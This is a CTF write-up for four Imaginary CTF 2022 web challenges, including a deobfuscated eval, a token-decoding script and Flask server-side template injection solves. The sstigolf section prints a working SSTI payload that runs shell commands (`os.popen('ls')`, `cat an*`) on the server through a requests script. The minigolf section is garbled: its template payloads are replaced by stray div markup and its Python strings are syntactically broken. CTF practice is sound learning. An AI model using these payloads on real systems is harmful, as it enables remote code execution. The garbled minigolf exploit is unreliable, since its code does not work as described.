# Imaginary CTF 2022

## 8-Imaginary-CTF-2022-Writeup

## Web

### Button

#### Description

Apparently one of these buttons isn't useless... URL: http://button.chal.imaginaryctf.org/

#### Solve

For this challenge, you have to read the codes via inspect element or view-page-source, and you will see this line:

```
<script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('G(z(p,a,c,k,e,d){e=z(c){A c.B(L)};E(!\'\'.D(/^/,I)){C(c--){d[c.B(a)]=k[c]||c.B(a)}k=[z(e){A d[e]}];e=z(){A\'\\\\w+\'};c=1};C(c--){E(k[c]){p=p.D(J K(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c])}}A p}(\'l(9(p,a,c,k,e,d){e=9(c){f c};j(!\\\'\\\'.i(/^/,q)){h(c--){d[c]=k[c]||c}k=[9(e){f d[e]}];e=9(){f\\\'\\\\\\\\w+\\\'};c=1};h(c--){j(k[c]){p=p.i(n m(\\\'\\\\\\\\b\\\'+e(c)+\\\'\\\\\\\\b\\\',\\\'g\\\'),k[c])}}f p}(\\\'1 7(){0("6{5}")}1 4(){0("3{2!}")}\\\',8,8,\\\'r|9|s|t|u|v|x|y\\\'.o(\\\'|\\\'),0,{}))\',F,F,\'|||||||||z||||||A||C|D|E||G|K|J|H||I|M|S|O|P|Q||R|N\'.H(\'|\'),0,{}))',55,55,'|||||||||||||||||||||||||||||||||||function|return|toString|while|replace|if|35|eval|split|String|new|RegExp|36|alert|notSusFunction|ictf|motSusfunclion|n0t_7h3_f1ag|jctf|y0u_f0und_7h3_f1ag'.split('|'),0,{}))</script>
```

the code is quite messy, but we know it's the flag right there, when you read it closely, we see this `motSusfunclion`, it's a method (you can search in the source code, and you see it's one of the button, and we can call it by using console from browser.

![](<../../.gitbook/assets/image (3).png>)

![](<../../.gitbook/assets/image (2).png>)

### rooCookie.js

#### Description

Roo seems to have left his computer on, can you find his password? URL: http://roocookie.chal.imaginaryctf.org

#### Solve

First, we need to inspect element, and skimming through the code, this is the interesting part:

```javascript
// original function that create the token
function createToken(text) {
    let encrypted = "";
    for (let i = 0; i < text.length; i++) {
            encrypted += ((text[i].charCodeAt(0)-43+1337) >> 0).toString(2)
    }
    return encrypted
}
```

This is how the function encode the flag into decrypted form, so the assignment is to reverse the method to regenerate the actual page, fortunately, the code is not that complicated, and we can trace back and decrypt the code.

```javascript
E = "101100000111011000000110101110011101100000001010111110010101101111101011110111010111001110101001011101001100001011000000010101111101101011111011010011000010100101110101001101001010010111010101111110101011011111011000000110110000001101100001011010111110110110000000101011100101010100101110100110000101011101111010111000110110000010101011101001011000100110101110110101001111101010111111010101000001101011011011010100010110101110110101011011111010100010110101101101101100001011010110111110101000011101011111001010100010110101101101101100000101010011111010100111110101011011011010111000010101000010101011100101011000101110100110000"
A = "10101101111" // a


// original function that create the token
function createToken(text) {
    let encrypted = "";
    for (let i = 0; i < text.length; i++) {
            encrypted += ((text[i].charCodeAt(0)-43+1337) >> 0).toString(2)
    }
    return encrypted
}

// try to reverse the function
function createTokenReverse(text) {
    let encrypted = "";
    for (let i = 0; i < text.length; i++) {
            encrypted += ((text[i].charCodeAt(0)-43+1337) >> 0)
    }
    return encrypted
}

// decode one character (binary) to char
function decode(text) {
    let decrypted = "";
    decrypted += (String.fromCharCode(parseInt(text, 2)+43-1337))
    return decrypted
}

// decode all the text
function decodeAll(text) {
    let tt = text.match(/.{1,11}/g); 
    let decrypted = "";
    for (const t of tt) {
        decrypted += decode(t)
    }
    return decrypted
}

// try to encode
console.log(createToken("a"))
console.log(createTokenReverse("a"))

// try to decode
console.log(decode(A))
console.log(decodeAll(E))
```

### sstigolf

#### Description

Just in case you didn't get enough golf with the other challenge. Flag is in an arbitrarily named file, but in the same directory. URL: https://sstigolf.ictf2022.iciaran.com Source code:

```python
from flask import Flask, render_template_string, request, Response

app = Flask(__name__)

@app.route('/')
def index():
    return Response(open(__file__).read(), mimetype='text/plain')

@app.route('/ssti')
def ssti():
    query = request.args['query'] if 'query' in request.args else '...'
    if len(query) > 49:
        return "Too long!"
    return render_template_string(query)
```

#### Solve

classic SSTI on python's Flask, you can test it by using `{{ 7*7 }}` payload and it works, but with the catch: the payload is limited to 49 characters long.

The important thing to do is to limit our payload to this ssti endpoint, I found this payload from a blogpost `lipsum.__globals__.os.popen(<os_command>).read()`.

This is how to solve it:

```python
import requests

URL = "https://sstigolf.ictf2022.iciaran.com"
requestURL = f"{URL}/ssti"

# search for where the flag is
print("--ls files--")
query_params = {
    "query": "{{lipsum.__globals__.os.popen('ls').read()}}"
}
response = requests.get(requestURL, params=query_params)
print("requestURL:", requestURL, query_params)
print("response web:", response.text)

# we need to input the name, but we have limited payload, we can just use asterisk to catch the rest of filename
print("--cat files--")
query_params = {
    "query": "{{lipsum.__globals__.os.popen('cat an*').read()}}"
}
response = requests.get(requestURL, params=query_params)
print("requestURL:", requestURL, query_params)
print("response web:", response.text)
```

### minigolf

#### Description

Too much Flask last year... let's bring it back again. URL: http://minigolf.chal.imaginaryctf.org Source code:

```python
from flask import Flask, render_template_string, request, Response
import html

app = Flask(__name__)

blacklist = ["{{", "}}", "[", "]", "_"]

@app.route('/', methods=['GET'])
def home():
  print(request.args)
  if "txt" in request.args.keys():
    txt = html.escape(request.args["txt"])
    if any([n in txt for n in blacklist]):
      return "Not allowed."
    if len(txt) <= 69:
      return render_template_string(txt)
    else:
      return "Too long."
  return Response(open(__file__).read(), mimetype='text/plain')

app.run('0.0.0.0', 8080)
```

#### Solve

This is the harder version of the previous challenge, so first, our payload is limited, and also the web blocked this characters: `["{{", "}}", "[", "]", "_"]` so we can't input the usual `{{}}` for the payload.

Fortunately, we have an alternative to replace `{{}}` in flask templating engine, we can use `<div data-gb-custom-block data-tag="if" data-0='1' data-1='1' data-2='1' data-3='1' data-4='1' data-5='1' data-6='1' data-7='1' data-8='1' data-9='1' data-10='1' data-11='1' data-12='1' data-13='1'></div>`.

and for the limited characters in the payload, we need some intermediate step to do for executing this exploit, we can use the config's env variable, because we can inject the value by SSTI.

This `<div data-gb-custom-block data-tag="if" data-0='1' data-1='1' data-2='1' data-3='1' data-4='1' data-5='1' data-6='1' data-7='1' data-8='1' data-9='1' data-10='1' data-11='1' data-12='1' data-13='1'></div>` will need to execute `<something>` before comparing it to `1` si that's why this works in this case. and because there's no restriction on the get\_param length, we can use that for our intermediate payload.

```python
from pprint import pprint
import requests
import html

URL = "http://minigolf.chal.imaginaryctf.org/"

# full payload: {{lipsum.__globals__.os.popen('ls').read()}}

print("-------- loop1: save __globals__ to config")
query_param = {
    "q": "__globals__",
    "txt": "<div data-gb-custom-block data-tag="if" data-0='1' data-1='1' data-2='1' data-3='1' data-4='1' data-5='1' data-6='1' data-7='1' data-8='1' data-9='1' data-10='1' data-11='1' data-12='1' data-13='1' data-14='1' data-15='1' data-16='1' data-17='1' data-18='1' data-19='1' data-20='1' data-21='1' data-22='1' data-23='1' data-24='1' data-25='1' data-26='1' data-27='1' data-28='1' data-29='1' data-30='1' data-31='1' data-32='1' data-33='1'>1</div>"
}
response = requests.get(URL, params=query_param)
config = requests.get(URL, params={
    "txt": "<div data-gb-custom-block data-tag="print"></div>"
})
print("requestURL:", URL, query_param)
print("response web:", response.text)
print("injected config:", html.unescape(config.text))


print("\n-------- loop2: put ls command in the config")
query = "ls"
query_param = {
    "q": "ls",
    "txt": "<div data-gb-custom-block data-tag="if" data-0='1' data-1='1' data-2='1' data-3='1' data-4='1' data-5='1' data-6='1' data-7='1' data-8='1' data-9='1' data-10='1' data-11='1' data-12='1' data-13='1' data-14='1' data-15='1' data-16='1' data-17='1' data-18='1' data-19='1' data-20='1' data-21='1' data-22='1' data-23='1' data-24='1' data-25='1' data-26='1' data-27='1' data-28='1' data-29='1' data-30='1' data-31='1' data-32='1' data-33='1'>1</div>"
}
response = requests.get(URL, params=query_param)
config = requests.get(URL, params={
    "txt": "<div data-gb-custom-block data-tag="print"></div>"
})
print("requestURL:", URL, query_param)
print("response web:", response.text)
print("injected config:", html.unescape(config.text))


print("\n-------- loop3: run ls command")
query_param = {
    "txt": "<div data-gb-custom-block data-tag="print"></div>"
}
response = requests.get(URL, params=query_param)
print("requestURL:", URL, query_param)
print("response web:", response.text)


print("\n-------- loop4: put cat flag.txt in config")
query_param = {
    "q": "cat flag.txt",
    "txt": "<div data-gb-custom-block data-tag="if" data-0='1' data-1='1' data-2='1' data-3='1' data-4='1' data-5='1' data-6='1' data-7='1' data-8='1' data-9='1' data-10='1' data-11='1' data-12='1' data-13='1' data-14='1' data-15='1' data-16='1' data-17='1' data-18='1' data-19='1' data-20='1' data-21='1' data-22='1' data-23='1' data-24='1' data-25='1' data-26='1' data-27='1' data-28='1' data-29='1' data-30='1' data-31='1' data-32='1' data-33='1'>1</div>"
}
response = requests.get(URL, params=query_param)
config = requests.get(URL, params={
    "txt": "<div data-gb-custom-block data-tag="print"></div>"
})
print("requestURL:", URL, query_param)
print("response web:", response.text)
print("injected config:", html.unescape(config.text))

print("\n--------loop5: print flag")
query_param = {
    "txt": "<div data-gb-custom-block data-tag="print"></div>"
}
response = requests.get(URL, params=query_param)
print("requestURL:", URL, query_param)
print("response web:", response.text)
```
